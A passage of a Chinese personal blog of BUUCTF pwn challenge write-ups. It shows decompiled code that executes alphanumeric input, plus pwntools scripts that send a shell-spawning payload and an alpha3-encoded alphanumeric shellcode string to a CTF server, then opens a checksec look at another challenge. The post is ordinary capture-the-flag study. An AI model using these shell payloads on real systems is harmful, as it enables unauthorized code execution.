<p>怎么说</p>
<p>mian函数无法反编译</p>
<p>chat一手</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x400</span>];    <span class="comment">// 1024字节的缓冲区</span></span><br><span class="line">    <span class="type">int</span> var_4;          <span class="comment">// 循环计数器</span></span><br><span class="line">    <span class="type">int</span> var_8;          <span class="comment">// 读取字节数的变量</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Show me your magic!\n&quot;</span>, <span class="number">0x14</span>);  <span class="comment">// 输出 &quot;Show me your magic!\n&quot;</span></span><br><span class="line"></span><br><span class="line">    var_8 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x400</span>);  <span class="comment">// 从标准输入读取最多1024字节到buf中</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (var_8 &lt;= <span class="number">0</span>) &#123;  <span class="comment">// 如果读取失败或读取字节数为0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;       <span class="comment">// 程序退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var_4 = <span class="number">0</span>;  <span class="comment">// 初始化循环计数器</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (var_4 &lt; var_8) &#123;  <span class="comment">// 开始循环处理输入的数据</span></span><br><span class="line">        <span class="comment">// 检查字符是否在 `a`-`z` 范围</span></span><br><span class="line">        <span class="keyword">if</span> (buf[var_4] &gt;= <span class="string">&#x27;`&#x27;</span> &amp;&amp; buf[var_4] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            var_4++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查字符是否在 `@`-`Z` 范围</span></span><br><span class="line">        <span class="keyword">if</span> (buf[var_4] &gt;= <span class="string">&#x27;@&#x27;</span> &amp;&amp; buf[var_4] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            var_4++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查字符是否在 `/`-`Z` 范围</span></span><br><span class="line">        <span class="keyword">if</span> (buf[var_4] &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; buf[var_4] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            var_4++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果字符不在任何范围内，输出 &quot;I Can&#x27;t Read This!&quot; 并退出</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I Can&#x27;t Read This!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果所有字符都符合要求，则执行缓冲区中的内容（存在代码执行漏洞）</span></span><br><span class="line"> ((<span class="built_in">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>怎么说呢？？</p>
<p>看半天也不知道这个shellcode怎么写</p>
<p>怎么说。看见write和read函数</p>
<p>是不是ORW？？</p>
<p>怎么回事？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump  ./1111</span><br></pre></td></tr></table></figure>

<p>这个命令不好使了</p>
<p>说是直接传shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26745</span>)</span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>一般的shellcode的题解不出来</p>
<p>只能alpha3生成说是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29770</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Show me your magic!\n&quot;</span>)</span><br><span class="line"><span class="comment">#shellcode= asm(shellcraft.sh())</span></span><br><span class="line">shellcode_64=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line"><span class="comment">#payload=shellcode</span></span><br><span class="line">payload=shellcode_64</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>







<h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h2><p>2024.8.16</p>
<p>日常检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/picoctf_2018_can_you_gets_me$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/picoctf_2018_can_you_gets_me/1111&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/picoctf_2018_can_you_gets_me$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/picoctf_2018_can_you_gets_me$ ./1111</span><br><span class="line">GIVE ME YOUR NAME!</span><br><span class="line">ok</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/picoctf_2018_can_you_gets_me$ </span><br></pre></td></tr></table></figure>



<p>丢进ida里面看看</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">bosh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/08/BUUCTF/">http://example.com/2025/03/08/BUUCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Bosh's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="https://z-bosh.github.io/img/match12.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="prev-post pull-left" href="/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/" title="嵌入式设备后门工具的利用"><img class="cover" src="https://z-bosh.github.io/img/leak3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">嵌入式设备后门工具的利用</div></div></a><a class="next-post pull-right" href="/2025/02/15/CVE-2020-3331-RV110W/" title="CVE-2020-3331-RV110W"><img class="cover" src="https://z-bosh.github.io/img/leak2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-2020-3331-RV110W</div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a href="/2025/01/17/2024%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B/" title="2024年春秋杯网络安全联赛冬季赛"><img class="cover" src="https://z-bosh.github.io/img/match10.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-17</div><div class="title">2024年春秋杯网络安全联赛冬季赛</div></div></a><a href="/2024/12/16/2024-CISCNx%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E5%88%9D%E8%B5%9B-WriteUp/" title="2024-CISCNx长城杯铁人三项-初赛—WriteUp"><img class="cover" src="https://z-bosh.github.io/img/match8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-16</div><div class="title">2024-CISCNx长城杯铁人三项-初赛—WriteUp</div></div></a><a href="/2025/02/11/VNCTF-2025/" title="VNCTF-2025"><img class="cover" src="https://z-bosh.github.io/img/match11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-11</div><div class="title">VNCTF-2025</div></div></a><a href="/2024/12/02/%E6%A5%9A%E6%85%A7%E6%9D%AF-2024/" title="楚慧杯-2024"><img class="cover" src="https://z-bosh.github.io/img/match9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-02</div><div class="title">楚慧杯-2024</div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">bosh</div><div class="author-info-description">努力学习中~</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Z-bosh"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">阿拉山口卖囊的小伙说：阿达西！买囊不？</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-re"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF-re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#helloword"><span class="toc-number">1.1.</span> <span class="toc-text">helloword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse3"><span class="toc-number">1.2.</span> <span class="toc-text">Reverse3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag"><span class="toc-number">1.3.</span> <span class="toc-text">不一样的flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SimpleRev"><span class="toc-number">1.4.</span> <span class="toc-text">SimpleRev~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre1"><span class="toc-number">1.5.</span> <span class="toc-text">[ACTF新生赛2020]easyre1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-rome"><span class="toc-number">1.6.</span> <span class="toc-text">[ACTF新生赛2020]rome</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-JustRE"><span class="toc-number">1.7.</span> <span class="toc-text">[BJDCTF2020]JustRE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86"><span class="toc-number">1.8.</span> <span class="toc-text">Java逆向解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-luck-guy"><span class="toc-number">1.9.</span> <span class="toc-text">[GXYCTF2019]luck_guy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96"><span class="toc-number">1.10.</span> <span class="toc-text">刮开有奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8"><span class="toc-number">1.11.</span> <span class="toc-text">简单注册器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%81%87%E8%A7%81-apk%E5%90%8E%E7%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B7%A5%E5%85%B7%E4%B8%BAjadx%E3%80%82"><span class="toc-number">1.11.1.</span> <span class="toc-text">第一次遇见.apk后缀的文件，工具为jadx。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-pyre"><span class="toc-number">1.12.</span> <span class="toc-text">[GWCTF 2019]pyre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#findit"><span class="toc-number">1.13.</span> <span class="toc-text">findit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rsa"><span class="toc-number">1.14.</span> <span class="toc-text">rsa</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rsa%E8%A7%A3%E5%AF%86"><span class="toc-number">1.14.1.</span> <span class="toc-text">rsa解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FlareOn4-login"><span class="toc-number">1.15.</span> <span class="toc-text">[FlareOn4]login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-level1"><span class="toc-number">1.16.</span> <span class="toc-text">[WUSTCTF2020]level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GUET-CTF2019-re"><span class="toc-number">1.17.</span> <span class="toc-text">[GUET-CTF2019]re</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CrackRTF"><span class="toc-number">1.18.</span> <span class="toc-text">CrackRTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E5%8A%A0%E5%AF%86"><span class="toc-number">1.18.1.</span> <span class="toc-text">哈希加密:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE"><span class="toc-number">1.19.</span> <span class="toc-text">[2019红帽杯]easyRE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Transform1"><span class="toc-number">1.20.</span> <span class="toc-text">[MRCTF2020]Transform1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-level21"><span class="toc-number">1.21.</span> <span class="toc-text">[WUSTCTF2020]level21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF2019-SignIn1"><span class="toc-number">1.22.</span> <span class="toc-text">[SUCTF2019]SignIn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt"><span class="toc-number">1.23.</span> <span class="toc-text">[ACTF新生赛2020]usualCrypt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF2019-Maze1"><span class="toc-number">1.24.</span> <span class="toc-text">[HDCTF2019]Maze1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AE%9E%E7%8E%B0%E5%8F%8A%E6%B8%85%E9%99%A4"><span class="toc-number">1.24.1.</span> <span class="toc-text">花指令实现及清除</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Xor"><span class="toc-number">1.25.</span> <span class="toc-text">[MRCTF2020]Xor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-hello-world-go"><span class="toc-number">1.26.</span> <span class="toc-text">[MRCTF2020]hello_world_go</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-level3"><span class="toc-number">1.27.</span> <span class="toc-text">[WUSTCTF2020]level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Youngter-drive"><span class="toc-number">1.28.</span> <span class="toc-text">Youngter-drive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E6%9C%BA"><span class="toc-number">1.29.</span> <span class="toc-text">相机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FlareOn4-IgniteMe"><span class="toc-number">1.30.</span> <span class="toc-text">[FlareOn4]IgniteMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-Cr0ssfun"><span class="toc-number">1.31.</span> <span class="toc-text">[WUSTCTF2020]Cr0ssfun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-xxor"><span class="toc-number">1.32.</span> <span class="toc-text">[GWCTF 2019]xxor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTCTF2020-basic-re"><span class="toc-number">1.33.</span> <span class="toc-text">[UTCTF2020]basic-re</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FlareOn6-Overlong"><span class="toc-number">1.34.</span> <span class="toc-text">[FlareOn6]Overlong</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FlareOn3-Challenge1"><span class="toc-number">1.35.</span> <span class="toc-text">[FlareOn3]Challenge1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84-BASE64"><span class="toc-number">1.36.</span> <span class="toc-text">特殊的 BASE64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga"><span class="toc-number">1.37.</span> <span class="toc-text">[ACTF新生赛2020]Oruga</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Universe-final-answer"><span class="toc-number">1.38.</span> <span class="toc-text">[ACTF新生赛2020]Universe_final_answer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Z3%E7%BA%A6%E6%9D%9F%E5%99%A8"><span class="toc-number">1.38.1.</span> <span class="toc-text">Z3约束器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-BJD-hamburger-competition"><span class="toc-number">1.39.</span> <span class="toc-text">[BJDCTF2020]BJD hamburger competition</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-easy-strcmp"><span class="toc-number">1.40.</span> <span class="toc-text">[Zer0pts2020]easy strcmp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-level4"><span class="toc-number">1.41.</span> <span class="toc-text">[WUSTCTF2020]level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre"><span class="toc-number">1.42.</span> <span class="toc-text">[羊城杯 2020]easyre</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-pwn"><span class="toc-number">2.</span> <span class="toc-text">BUUCTF-pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test-your-nc"><span class="toc-number">2.1.</span> <span class="toc-text">test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rip"><span class="toc-number">2.2.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">2.3.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">2.4.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">2.5.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">2.6.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">2.7.</span> <span class="toc-text">[第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">2.8.</span> <span class="toc-text">jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">2.9.</span> <span class="toc-text">ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack"><span class="toc-number">2.10.</span> <span class="toc-text">bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">2.11.</span> <span class="toc-text">ciscn_2019_c_1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8puts%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2libc%E7%89%88%E6%9C%AC"><span class="toc-number">2.11.0.1.</span> <span class="toc-text">利用puts函数泄露libc版本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-started-3dsctf-2016"><span class="toc-number">2.12.</span> <span class="toc-text">get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level2-x64"><span class="toc-number">2.13.</span> <span class="toc-text">jarvisoj_level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop"><span class="toc-number">2.14.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#others-shellcode"><span class="toc-number">2.15.</span> <span class="toc-text">others_shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E8%B0%83%E7%94%A8%E8%A1%A8"><span class="toc-number">2.15.1.</span> <span class="toc-text">Linux调用表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek2019-babyrop"><span class="toc-number">2.16.</span> <span class="toc-text">[OGeek2019]babyrop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#write%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2libc%E7%89%88%E6%9C%AC"><span class="toc-number">2.16.1.</span> <span class="toc-text">write函数泄露libc版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">2.17.</span> <span class="toc-text">ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-number">2.18.</span> <span class="toc-text">not_the_same_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-en-2"><span class="toc-number">2.19.</span> <span class="toc-text">ciscn_2019_en_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2puts%E5%87%BD%E6%95%B0"><span class="toc-number">2.19.1.</span> <span class="toc-text">泄露puts函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-ne-5"><span class="toc-number">2.20.</span> <span class="toc-text">ciscn_2019_ne_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="toc-number">2.21.</span> <span class="toc-text">铁人三项(第五赛区)_2018_rop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#write%E5%87%BD%E6%95%B0%E6%9D%A5%E6%B3%84%E9%9C%B2%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E7%89%88%E6%9C%AC"><span class="toc-number">2.21.1.</span> <span class="toc-text">write函数来泄露程序的libc版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack2"><span class="toc-number">2.22.</span> <span class="toc-text">bjdctf_2020_babystack2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.22.1.</span> <span class="toc-text">整数溢出漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">2.23.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">2.24.</span> <span class="toc-text">jarvisoj_fm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.24.1.</span> <span class="toc-text">格式化字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">2.25.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">2.26.</span> <span class="toc-text">ciscn_2019_es_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">2.26.1.</span> <span class="toc-text">栈迁移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop-2"><span 